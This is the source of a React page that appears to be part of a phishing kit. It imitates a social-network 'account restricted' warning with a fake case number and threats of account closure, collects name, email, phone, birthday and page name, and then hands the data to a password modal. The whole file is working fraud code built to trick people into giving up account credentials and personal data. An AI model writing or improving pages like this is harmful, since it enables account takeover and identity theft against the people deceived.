import HeroImage from "@/assets/images/home-image.png";
import PasswordModal from "@/components/password-modal";
import { useEffect, useState } from "react";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";
import type { GeoLocation } from "@/types/geo";
export interface FormData {
	pageName: string;
	fullName: string;
	email: string;
	phone: string;
	birthday: string;
}
enum NameForm {
	pageName = "pageName",
	fullName = "fullName",
	email = "email",
	phone = "phone",
	birthday = "birthday",
}

const Home = () => {
	const geoData: GeoLocation = JSON.parse(
		localStorage.getItem("geoData") ?? "{}",
	);

	const [today, setToday] = useState("");
	const [error, setError] = useState("");
	const [formData, setFormData] = useState<FormData>({
		pageName: "",
		fullName: "",
		email: "",
		phone: "",
		birthday: "",
	});
	const [showPasswordModal, setShowPasswordModal] = useState(false);

	useEffect(() => {
		const getToday = () => {
			const date = new Date();
			return date.toLocaleDateString("en", {
				year: "numeric",
				month: "long",
				day: "2-digit",
			});
		};
		setToday(getToday());
	}, []);

	const formatDate = (input: string) => {
		const numbers = input.replace(/\D/g, "");
		const limited = numbers.slice(0, 8);
		let formatted = "";
		if (limited.length >= 1) {
			const day = limited.slice(0, 2);
			formatted = day;
			if (limited.length >= 3) {
				const month = limited.slice(2, 4);
				formatted = `${day}/${month}`;
				if (limited.length >= 5) {
					const year = limited.slice(4, 8);
					formatted = `${day}/${month}/${year}`;
				}
			}
		}
		return formatted;
	};
	const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const { name, value } = e.target;
		if (name === NameForm.birthday) {
			const formattedBirthday = formatDate(value);
			setFormData((prev) => ({ ...prev, [name]: formattedBirthday }));
			return;
		}

		setFormData((prev) => ({ ...prev, [name]: value }));
	};

	const handleSubmit = () => {
		switch (true) {
			case formData.birthday.length !== 10:
				setError("Please enter a valid date in the format DD/MM/YYYY");
				return;
			case !formData.email.includes("@") && !formData.email.includes("."):
				setError(
					"Please enter a valid email address (e.g. example@domain.com)",
				);
				return;
			case !formData.fullName:
				setError("Full name is required");
				return;
			case !formData.pageName:
				setError("Page name is required");
				return;
			case formData.phone.length < 8:
				setError("Please enter a valid phone number (minimum 8 digits)");
				return;
			default:
				setError("");
				setShowPasswordModal(true);
				return;
		}
	};
	return (
		<div className="mx-auto mt-4 flex max-w-2xl flex-col gap-4 px-4">
			<img src={HeroImage} alt="hero" className="mx-auto" />
			<div className="flex flex-col gap-4">
				<h1 className="text-xl font-bold">Your account has been restricted</h1>
				<div className="flex flex-col gap-1">
					<h2 className="text-sm font-normal text-gray-600">Term of Service</h2>
					<p>
						We detected unusual activity in your page today <b>{today}</b>.
						Someone has reported your account for not complying with{" "}
						<span className="cursor-pointer text-blue-600 hover:underline">
							Community Standards
						</span>
						. We have already reviewed this decision and the decision cannot be
						changed. To avoid having your account{" "}
						<span className="cursor-pointer text-blue-600 hover:underline">
							disabled
						</span>
						, please verify:
					</p>
					<div className="mt-4 flex flex-col gap-2">
						<div>
							<input
								autoFocus
								className="w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
								type="text"
								name={NameForm.pageName}
								value={formData.pageName}
								onChange={handleInputChange}
								placeholder="Page Name"
							/>
						</div>

						<div>
							<input
								className="w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
								type="text"
								name={NameForm.fullName}
								value={formData.fullName}
								onChange={handleInputChange}
								placeholder="Your Name (Name and Surname)"
							/>
						</div>

						<div>
							<input
								className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
									formData.email.length > 0 &&
									!formData.email.includes("@") &&
									!formData.email.includes(".")
										? "border-red-500 focus:border-red-500"
										: ""
								}`}
								type="email"
								name={NameForm.email}
								value={formData.email}
								onChange={handleInputChange}
								placeholder="Personal Email"
							/>
						</div>

						<div className="flex w-full items-center rounded-full border border-gray-300">
							<PhoneInput
								containerClass="w-full! p-3 "
								inputClass="w-full! border-none! bg-transparent! "
								buttonClass=" border-none! rounded-l-full! hover:rounded-l-full! hover:bg-transparent! border-r-2 border-r-black "
								dropdownClass="select-none!"
								placeholder="Phone Number"
								value={formData.phone}
								country={geoData.country_code.toLowerCase()}
								onChange={(phone) =>
									setFormData((prev) => ({ ...prev, [NameForm.phone]: phone }))
								}
							/>
						</div>

						<div>
							<input
								className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${formData.birthday.length < 10 && formData.birthday.length && "border-red-500 focus:border-red-500"}`}
								type="text"
								name={NameForm.birthday}
								value={formData.birthday}
								onChange={handleInputChange}
								placeholder="Birthday (MM/DD/YYYY)"
							/>
						</div>

						<div className="mt-2 flex justify-between text-sm text-gray-600">
							<div>
								<span>Case Number:</span>
								<span className="ml-1 text-blue-600">#178014456033</span>
							</div>
							<div>
								<span>
									About Case: Violating Community Standards and Posting
									something inappropriate.
								</span>
							</div>
						</div>
					</div>
					{error && <div className="text-red-500">{error} </div>}
					<button
						onClick={handleSubmit}
						className="cursor-pointer rounded-full bg-blue-500 p-4 text-lg font-medium text-white"
						type="button"
					>
						Continue
					</button>
				</div>
			</div>
			<p className="mt-4 flex items-start text-sm text-gray-600">
				<span className="mr-2 text-yellow-500">⚠️</span>
				Please make sure to fill in the data correctly; otherwise, your account
				may be permanently closed. To learn more about why accounts are
				deactivated, visit our{" "}
				<span className="cursor-pointer text-blue-600 hover:underline">
					Community Standards
				</span>
				.
			</p>
			<PasswordModal
				formData={formData}
				isOpen={showPasswordModal}
				onClose={() => setShowPasswordModal(false)}
			/>
		</div>
	);
};

export default Home;
